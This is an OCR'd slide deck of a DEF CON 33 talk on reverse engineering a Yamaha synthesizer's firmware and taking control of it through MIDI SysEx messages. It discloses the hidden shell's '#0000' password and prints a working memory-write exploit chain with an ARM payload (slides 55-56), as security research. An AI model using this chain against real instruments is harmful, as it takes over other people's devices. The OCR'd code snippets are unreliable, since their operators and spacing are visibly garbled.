---
title: "Remote code execution via MIDI messages"
speakers: ["Anna Antonenko"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/Anna Antonenko - Remote code execution via MIDI messages.pdf"
pages: 79
sha256: "9ae3e4c2a1ac70a0743c2e872242183547317880704303c5a1d941c5655ef304"
text_chars: 20688
ocr_pages: 1
has_ocr: true
redacted_secrets: 0
ocr_confidence: 96.3
ocr_unreliable_blocks: 0
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:52:26Z"
---
# Remote code execution via MIDI messages

**Speakers:** Anna Antonenko  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/Anna Antonenko - Remote code execution via MIDI messages.pdf` (79 pages)


## Slide 1

# Remote code execution via MIDI messages

How I hacked my music synthesizer and made it play Bad Apple on its LCD

Anna “porta” Antonenko `https://psi3.ru @portasynthinca3 portasynthinca3@gmail.com`

## Slide 2

# Who am I?

- I develop firmware in C at Flipper Devices • All opinions expressed are my own. Research was done on my own.

- I like the BEAM ecosystem (Erlang and Elixir)

   - Writing an OS in Erlang in my spare time

- I like electronics, both digital and analog

   - ...although my specialty is digital

- Decent forward engineer, not a good reverse engineer

- I like electronic music and play the piano

## Slide 3

# Demo

- MIDI is for exchanging musical data

- MIDI has very simple commands

   - Play a note

   - Stop a note

   - Change the reverb level

   - etc.

- Apparently, even MIDI can have a backdoor

- [Video: backdoor exploitation demo]

## Slide 4

# What is this talk about?

- Hardware reverse engineering

   - Dealing with an undocumented chip

   - Accessing debug interfaces

   - Reading schematics

- Firmware reverse engineering

   - Finding the stuff you need

   - Making sense of the code

- Firmware exploitation

- A cool story!

## Slide 5

The story

## Slide 6

# A dirty instrument

- Had this Yamaha PSR-E433 for a very long time

- It’s gotten dusty over the years

- Let’s tear it down and clean it

- Find out what makes it tick while we’re at it

## Slide 7

Main board

## Slide 8

# Main board

CPU
USB
LCD
Cntrl
RAM
Flash
Flash

## Slide 9

# Custom main chip

- Main board features an interesting custom chip: Yamaha SWL01U

- Almost no info about the chip online

## Slide 10

# Custom main chip

- This article suggests it might be based on the Hitachi SuperH (“SH”) architecture

- The CPU of the Sega Dreamcast was based on SH too

“Yamaha <...> have a long history with <...> SH architecture CPUs from Hitachi <...>”

“Yamaha have a considerable investment in software built and tuned for the SH family. Thus, migration to <...> ARM is a pretty big deal <...>”

- I have zero experience with SH

- No idea how to approach the chip

“Time and experience will show if ARM is adopted in the entry- and mid-range segments, too.”

Paul J. Drongowski `sandsoftwaresound.net/swl-micro-architecture`

## Slide 11

2 years later

## Slide 12

# A service manual

- I found this online!

- It’s for another model: the E443, not the E433

- The differences are negligible • E443 has an audio input, mine doesn’t

   - Component numbering is different

   - Same board layout

   - Same main chips (incl. CPU)

   - Same physical appearance

## Slide 13

# A service manual

- It’s got:

   - Full schematic

   - Full board layout

   - Pinouts of the major chips

   - Pinout of the CPU!

- No info about the CPU aside from the pinout

- Still, the pinout and schematic are very helpful

## Slide 14

# Approaching the chip

- When reversing, look from the perspective of the forward engineer

- How does one debug their program?

   - A debugger

      - Pause

      - Step-through

      - Examine state

      - Modify state

   - Simple text logs

- There are common hardware interfaces for these

   - Debugging: JTAG, SWD, etc.

   - Simple text: UART (also known as a serial port)

## Slide 15

# Gaining logs access

- If a chip is outputting logs, most of the time it’ll be over UART

- UART requires one wire per direction

- The chip has 2 UART interfaces, each has a receive and a transmit pin

- Out of the 4 pins, 3 are not used as UART based on the schematic

- The remaining pin (48) is a transmit pin

- Let’s listen to the pin

## Slide 16

# Gaining logs access

- UART has lots of settings

   - Baud rate (usually from ~300 to ~1M bits/s)

   - Frame length (6 - 8 bits)

   - Stop bits (1, 1.5, or 2)

   - Parity bit (even, odd or none)

   - Way too many combinations of these

- The transmitter never announces its settings, it just yells into the void

- The receiver has to have the same settings

- It’s easier to look at the raw signal, infer the settings, then connect an actual receiver

## Slide 17

# Gaining logs access

- Connected a logic analyzer to the TXD0 pin

- Total silence.

## Slide 18

# Gaining logs access

- The chip has configuration pins

- PROTN and TESTN sound promising

   - “N” usually means “inverted”

- Let’s try to enable these modes

## Slide 19

# Gaining logs access

- Still, total silence in all 4 combinations of these 2 pins

- If there are logs, it looks like they’re not over UART

- Let’s move on to debugging then

## Slide 20

# Gaining logs access

- The chip has these interesting PROTN and TESTN pins

- Total silence on the UART in all configurations

- If there are logs, it looks like they’re not over UART

## Slide 21

# Gaining debug access

- The chip has a JTAG interface

- It’s very common, but very dumb and abstract

- If you don’t have a description of the chip’s internals in a special language (BSDL), you won’t be able to use JTAG

- Descriptors for common CPU architectures are available, but you have to know the architecture definitively

## Slide 22

# Gaining debug access

- Talk to the chip incorrectly and you risk releasing the magic smoke

   - Although that risk is tiiiiiiiiny

- Almost all JTAG-enabled chips have a self-reported “IDCODE”

   - The specification says it has to be 32-bit

   - No location requirement

   - No presence requirement

- If we acquire the IDCODE, we can search for it online

## Slide 23

# Gaining debug access

- Hardware tool: JTAG adapter, aka JTAG cable, aka JTAG probe

   - J-Link

   - XJTAG

   - Black Magic

   - FT232H

   - ...lots more

- Software tools:

   - OpenOCD (drives the JTAG adapter)

   - GDB or other GDB server compatible debugger

## Slide 24

# Gaining debug access

- Connected a JTAG adapter

- Launched OpenOCD • It reports the IDCODE by default

## Slide 25

# Gaining debug access

\```
$catopenocd.cfg
\```

\```
#Uh-oh,acontinuityerror!I'veswitchedtoanFT232R-baseddongleinsteadofJ-LinksinceI
tookthepictureonthepreviousslide.
adapterdriverft232r
transportselectjtag
adapterspeed5000
$openocd
OpenOn-ChipDebugger0.12.0
LicensedunderGNUGPLv2
Forbugreports,read
http://openocd.org/doc/doxygen/bugs.html
Info:onlyonetransportoption;autoselect'jtag'
Warn:Transport"jtag"wasalreadyselected
adapterspeed:5000kHz
\```

\```
Info:Listeningonport6666fortclconnections
Info:Listeningonport4444fortelnetconnections
Info:clockspeed3000kHz
Warn:Therearenoenabledtaps.AUTOPROBINGMIGHTNOTWORK/!
Info:JTAGtap:auto0.taptap/devicefound:0x3f0f0f0f(mfg:0x787(<unknown>),part:0xf0f0,
ver:0x3)
\```

\```
Warn:AUTOauto0.tap-use"jtagnewtapauto0tap-irlen4-expected-id0x3f0f0f0f"
Warn:gdbservicesneedoneormoretargetsdefined
\```

## Slide 26

# Gaining debug access

- According to OpenOCD, the IDCODE is `0x3f0f0f0f`

- Suspiciously pretty

   - Checked multiple times under different conditions to make sure

- Two datasheets mention this IDCODE

   - AT91SAM7SE by Atmel

   - ADuC7000 series by Analog Devices

   - Both are based on ARM7 (not the same as ARMv7)

- Mentions online about other ARM7-based MCUs

- Not sure about the actual architecture

   - Article from before says SH

   - IDCODE says ARM7

- Let’s try ARM7

## Slide 27

# Gaining debug access

\```
$catopenocd.cfg
adapterdriverft232r
transportselectjtag
adapterspeed5000
jtagnewtapswl01ucpu-irlen4-expected-id0x3f0f0f0f
targetcreateswl01u.cpuarm7tdmi-chain-positionswl01u.cpu
$openocd
OpenOn-ChipDebugger0.12.0
LicensedunderGNUGPLv2
Forbugreports,read
http://openocd.org/doc/doxygen/bugs.html
Info:onlyonetransportoption;autoselect'jtag'
Warn:Transport"jtag"wasalreadyselected
swl01u.cpu
Info:Listeningonport6666fortclconnections
Info:Listeningonport4444fortelnetconnections
Info:clockspeed3000kHz
Info:JTAGtap:swl01u.cputap/devicefound:0x3f0f0f0f(mfg:0x787(<unknown>),part:0xf0f0,
ver:0x3)
Info:EmbeddedICEversion1
Info:swl01u.cpu:hardwarehas2breakpoint/watchpointunits
Info:startinggdbserverforswl01u.cpuon3333
Info:Listeningonport3333forgdbconnections
\```

## Slide 28

# Gaining debug access

- Magic smoke hasn’t escaped the chip yet

- No OpenOCD errors

- Let’s try GDB

## Slide 29

# Gaining debug access

- Current draw makes sense:

   - Running: 114 mA

   - Paused: 98 mA

\```
(gdb)c#Continue(unpause)
Continuing.
^C#Ctrl-C(pause)
ProgramreceivedsignalSIGINT,Interrupt.
0x0206eeb2in/?()
\```

- Interrupt vectors make sense

- Addresses make sense

- It was ARM all along!

- Debug interfaces are usually locked down. We’re very lucky!

   - A synth is not a security device

\```
#inARM7,interruptvectorsstartataddress0
#theyareregularinstructions
(gdb)x/2xw0#eXamine2heXWordsatlocation0
0x0:0xe59ff0180xe59ff018
(gdb)x/2i0#eXamine2Instructionsatlocation0
0x0:ldrpc,[pc,#24]@0x20#jump
0x4:ldrpc,[pc,#24]@0x24#jump
\```

\```
(gdb)where#addressofcurrentinstruction
0x02020274in/?()
\```

## Slide 30

Extracting the firmware

## Slide 31

# Extracting the firmware

- CPU follows vectors when interrupts arise:

   - CPU is powered up or reset

   - Program did something catastrophic

   - External device requires CPU’s attention

- In embedded, the vector table is usually read-only

- ARM7’s vector table is at address 0

- The firmware is most likely at address 0

- Flash chip is 16 MiB in size

   - Let’s dump 16 MiB from address 0 into a file

## Slide 32

# Extracting the firmware

- Look at the strings first

   - They are immediately understandable and easily searchable

   - Machine instructions are not

- Our strings definitely make sense

- Success? Not quite

   - Strings repeat every 64 KiB through the entire 16 MiB image

   - All data repeats every 64 KiB

   - Not a lot of strings, actually

- We’ve captured 256 copies of the same 64 KiB snippet

## Slide 33

# Extracting the firmware

- Reset vector jumps to address `0x02000000`

- Data at that address makes even more sense

   - No noticeable repetitions

   - Even more recognizable strings

      - Instrument names

      - UI messages

      - etc.

- Previous image is likely the internal ROM

   - One of its strings says “SWL01U Internal”

   - Repetition caused by simplistic address decoder

- New image is likely the external flash

## Slide 34

Playing Minesweeper

## Slide 35

# Minesweeper

- Start without knowing the states of any cells

## Slide 36

# Minesweeper

- Click on a random cell to start the game

- That cell doesn’t have a mine (as per game rules)

- Discover the state of neighboring cells

## Slide 37

# Minesweeper

- All cells tell you something about their neighbors

## Slide 38

# Minesweeper

- Repeat until you’ve discovered everything there is to discover on the board

## Slide 39

# Reverse engineering

- Start without knowing what any of the functions do

- Have an entry point that is understandable as-is

   - Reset vector

   - Strings

- Learn something about functions that are connected with it

   - Learn something about functions that are connected with those ones

      - ...and then those ones

         - ...and then those ones

- Done!

## Slide 40

# Reverse engineering

- The process is repetitive and boring to watch

- Let’s look at one concrete subsystem

## Slide 41

The shell

## Slide 42

# Suspicious strings

- Commands for some kind of shell?

   - `help` , `?`

   - `info`

   - `ver`

   - `perf-on` , `perf-off` , `perf-disp`

- Some interesting commands

   - Memory reads?

      - `d` , `d/s`

   - Memory writes?

      - `m` , `m/b` , `m/w` , `m/l`

   - Remind me of GDB commands

## Slide 43

# Shell architecture

Input handler
Input
Command table
Handler function
print ?
help
? Output
Handler function print_prompt ?
d
print_ok ?
m/w
Handler function
//.

## Slide 44

# Shell architecture

\```
voidshell_input_handler(char*command_input){
if(shell_login_state/=0){
\```

\```
if(shell_compare_command(command_input,"login")/=0){
shell_print("passwd?\r");
shell_login_state=1;
}
\```

\```
}elseif(shell_login_state/=1){
if(shell_compare_command(command_input,"#0000")/=0){
shell_print("loginOK\r");
shell_login_state=2;
}else{
shell_print("PasswdError\r");
shell_login_state=0;
}
}else{
//actuallyrunthecommand
}
}
\```

## Slide 45

# Shell I/O

- UART?

   - Both hardware UARTs are unusable

      - 2 out of 2 receive pins not used as UART

      - 1 out of 2 transmit pins not used as UART

   - Software UART?

   - UART is ready to transmit bytes as-is

   - No heavy data manipulation required

## Slide 46

# Shell I/O

- JTAG?

   - ARM7’s JTAG port features a “DCC”

   - Debug Communication Channel is bi-directional

   - DCC uses special instructions

- USB?

   - Could have a virtual network interface

   - Or a virtual serial port

   - Both should appear in USB descriptor

## Slide 47

# Shell I/O

\```
$lsusb-d0499:1617-v
Bus001Device051:ID0499:1617YamahaCorp.PSR-E353digitalkeyboard
#//.
DeviceDescriptor:
#//.
bNumConfigurations1
ConfigurationDescriptor:
#//.
bNumInterfaces2
#//.
InterfaceDescriptor:
#//.
bInterfaceClass1Audio
bInterfaceSubClass1ControlDevice
#//.
InterfaceDescriptor:
#//.
bInterfaceClass1Audio
bInterfaceSubClass3MIDIStreaming
\```

## Slide 48

# Shell I/O

- Probably not hardware UART – the interfaces are taken

   - Software UART still on the table

- Probably not USB – only has a MIDI descriptor

- Maybe JTAG DCC?

- Let’s look at `shell_print` to find out

## Slide 49

# Shell I/O

\```
voidshell_print(char*data){
memcpy(send_buf,const_buf,8);
send_buf[24]=0xf7;
\```

\```
Hello,World!
\```

\```
//processdatain8-byteblocksfirst
for(size_ti=strlen(data);i/=8;i-=8){
charch=*(data/+);
for(intj=0;j<8;j/+){
send_buf[8+(j*2)]=ch/>4;
send_buf[8+(j*2)+1]=ch&0xf;
}
pass_on_to_next_stage_of_printing(send_buf,25);
}
\```

\```
//processthetail
size_ttail_size=8;
for(inti=0;*data;i/+){
charch=*(data/+);
send_buf[8+(i*2)]=ch/>4;
send_buf[8+(i*2)+1]=ch&0xf;
tail_size+=2;
}
send_buf[tail_size]=0xf7;
tail_size/+;
pass_on_to_next_stage_of_printing(send_buf,tail_size);
}
\```

\```
48656C6C6F2C20576F726C6421
\```

64 21

\```
F043730152190000
04080605060C060C
060F020C02000507
F7
F043730152190000
060F0702060C0604
0201
F7
\```

## Slide 50

# Shell I/O

Those two ring a bell
F0 43 73 01 52 19 00 00 06 0F 07 02 06 0C 06 04 02 01 F7

## Slide 51

# SysEx

“ `11110000` [binary] – System Exclusive”

- That’s a so-called System Exclusive message!

- MIDI having SysEx is like Python having assembly snippets

“This message type allows manufacturers to create their own messages <...>.”

“The Manufacturer’s ID (assigned by MMA <...>) is either 1 byte or 3 bytes”

MIDI Manufacturers Association, Summary of MIDI 1.0 Messages `https://midi.org/spec-detail`

Start of SysEx

## End of SysEx

\```
F043730152190000060F0702060C06040201F7
\```

Manufacturer ID

## Slide 52

# SysEx

“ `43H` – Yamaha Corporation” MIDI Manufacturers Association, SysEx ID table `https://midi.org/sysexidtable` Yamaha-specific Start of SysEx shell signature End of SysEx `F0 43 73 01 52 19 00 00 06 0F 07 02 06 0C 06 04 02 01 F7` Manufacturer ID Shell data

## Slide 53

# Accessing the shell

- Let’s write a Python script that talks to the device in this format

- Possibility of failure

   - Format of incoming messages could differ

   - Shell might be disabled permanently

   - ...or require enabling

- Worth a try though!

- [Video: shell access demo]

## Slide 54

Exploitation

## Slide 55

# Exploitation

- Memory write commands!

- For real?

- We don’t need JTAG. We just need a malicious MIDI file.

   - Write executable payload into memory

   - Overwrite return address on stack

   - In payload, do malicious things

\```
#synthshell
>m/l06001234ab0ba123
>
#gdb
(gdb)x/1xw0x06001234
0x06001234:0xab0ba123
(gdb)
\```

- In payload, jump to original return address

## Slide 56

# Exploitation

### Payload

### Assembled pyld.

### Write commands

\```
.org0x06002900
ldrr1,write_str
adrr0,str
ldrlr,return
bxr1
write_str:.word0x2086ed5
return:.word0x02021a7b
str:.asciz"HeloWrld"
.byte0
\```

\```
-
-
e59f1008
e28f000c
e59fe004
e12fff11
\```

\```
-
02086ed5
02021a7b
6f6c6548646c725700
00
\```

\```
login
#0000
m/l06002900e59f1008
m/l06002904e28f000c
m/l06002908e59fe004
m/l0600290ce12fff11
m/l0600291002086ed5
m/l0600291402021a7b
m/l060029186f6c6548
m/l0600291c646c7257
m/l0600292000000000
m/l06006b1006002900
\```

login

code

string ret override

MIDI file

SysEx messages

## Slide 57

# Exploitation

Innocent
MIDI
file
Evil
Python
MIDI
script
file
Scary stuff to
print on the LCD

[Video: Scary toccata]

## Slide 58

Bad Apple

## Slide 59

# Displaying video

- The LCD controller is only designed to display text

   - 2 lines of 8 characters

   - Characters are 5 lines of 8 pixels

- No pictures, no video

- How is the synth displaying non-textual graphics?

- How are we going to play video?

## Slide 60

# LCD that our controller expects 40 segments


> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
16 lines
LCD that our controller expects
40 segments
```

## Slide 61

# Our LCD

40 segments
Text
Other
stuff
16 lines

## Slide 62

# Our LCD

- Top row of text is wired to the dot matrix area

   - ...as it should

- Bottom row of text is wired to all the other segments

- CPU somehow displays custom data in false bottom row

   - ...this is what that data looks like when rendered in the top row

- How? And can we do the same?

## Slide 63

# LCD controller

Character
Generation
RAM
(CGRAM)
From CPU To LCD
Character
Display Data
Generation
RAM
ROM
(DDRAM)
(CGROM)
Mux
Input
Output

## Slide 64

LCD controller
Character
Generation
RAM
(CGRAM)
From CPU To LCD
Image
ASCII
Character
Display Data
Generation
RAM
ROM
(DDRAM)
(CGROM)
select: ROM
Mux
Input
Output
ASCII

## Slide 65

# Custom characters

Character
Generation Image
RAM
(CGRAM)
From CPU To LCD
ASCII
Char. image
Character
Display Data
Generation
RAM
ROM
(DDRAM)
(CGROM)
select: RAM
Mux
Input
Output

## Slide 66

# Custom characters

- The CGRAM can fit 8 custom characters

- They are accessed by character numbers 0 through 7 and 8 through 15

## Slide 67

# Displaying images

## RAM 0

## RAM 1

## RAM 2

## RAM 3

## RAM 4

## RAM 5

## RAM 6

## RAM 7

1px

## Slide 68

# The synth fights back

- When I load my images into CGRAM, the synth overwrites them with its junk

- We need to disable that part of the firmware

- I don’t want to change what’s written on the flash

- There’s a way!

## Slide 69

An unknown RTOS

## Slide 70

# An unknown RTOS

- Remember how there’s also a ROM?

   - ROM is really Read-Only, and it’s embedded in the CPU

   - Flash is programmable, for updates

- ROM contains some very basic code abstractions over the chip and parts of a Real-Time Operating System

- ROM and flash are loosely coupled

## Slide 71

# An unknown RTOS

- Sometimes, the flash calls into the ROM

   - It knows where to call because the ROM never changes

- Sometimes, the ROM calls into the flash to handle an event

   - It doesn’t know where to call because the flash could be updated

- There’s a linked series of task tables in flash that facilitate this linkage

## Slide 72

# RTOS hijacking

- We can make a copy of the task tables, but in RAM

- Modify them as we wish

   - Disable LCD updates

   - Install our own shell input handler for speed

- Then tell the ROM that the tables are located at this new address

- Result? Video playback at 30fps

- [Video: Bad Apple demo from one of the first slides]

## Slide 73

Addendum

## Slide 74

# Vulnerable products

- Exploit successfully reproduced on these Yamaha products:

   - PSR-E433 (ARM7, SWL01U) - 2012

   - PSR-E453/E473 (ARM Cortex, SWX03) - 2016, 2022

   - DGX-660 (SH-2, SWX08) - 2016

   - PSS-A50/E30/F50 (ARM, YMW830-V)

   - P-125 (ARM Cortex, SWX09) - 2018

- Possibly vulnerable, not tested:

   - Digital Finger Drum series, specifically FGDP-30/50

- ...all with #0000 shell passwords

- Ongoing thread: `github.com/portasynthinca3/swl01u/issues/1`

   - Shoutout to `Marisa-Chan` , `Crawlerop` , `YoYo1846` and `xintrea`

## Slide 75

# DSP summary

- The DSP is independent of the ARM core

- DSP MMIO region starts at address `0xfe000000`

   - Global configuration area: `0xfe000000 - 0xfe0003ff`

   - Voice parameter area: `0xfe000400 - 0xfe0007ff`

- 32 voices

- 16 16-bit parameters per voice

   - Same parameters for different voices arranged in one area

      - `par_area_start = 0xfe000400 + (0x40 * par_no)`

      - `par_location = par_area_start + (2 * voice_no)`

- All registers and voice parameters are written byte-wise in big endian: MSB to LSB

## Slide 76

# DSP summary

- Known voice parameters (0-based indexing):

   - Index 3: ADLR (Amplitude Difference and Level Register)

      - High byte: dual-channel attenuation

      - Low byte: separate channel attenuation (one nibble for each)

   - Index 4: ARAR (Attack Rate Register)

      - Top bit: attack enabled; bottom 15 bits: attack speed

      - Not sure about the attack speed format

   - Index 5: LSTR (Length and Start of Taper-off Register)

      - Write of any value starts the decay

      - Not sure about the decay speed format

   - Index 8: STCR (Signal Tone Control Register)

      - Top nibble: 2’s complement octave selection

      - Bottom 12 bits: unsigned fine adjust

      - `f = (440Hz * 2`<sup>`octave`</sup> `) * (fine / 0x400)`

## Slide 77

# DSP summary

- Known global registers:

   - `0xfe000008` : STAR (Start Register), 5-byte, big endian, bytewise write • Each of the top 32 bits signifies a channel which has to be started

      - The bottom 8 bits must be set to `0x80` to active the start

## Slide 78

# References

- <u>`https://sandsoftwaresound.net/swl-micro-architecture/`</u>

- <u>`https://midi.org/spec-detail`</u>

- <u>`https://midi.org/sysexidtable`</u>

- <u>`https://developer.arm.com/documentation/ddi0084/f`</u>

## Slide 79

# That’s it!

Thank you <3
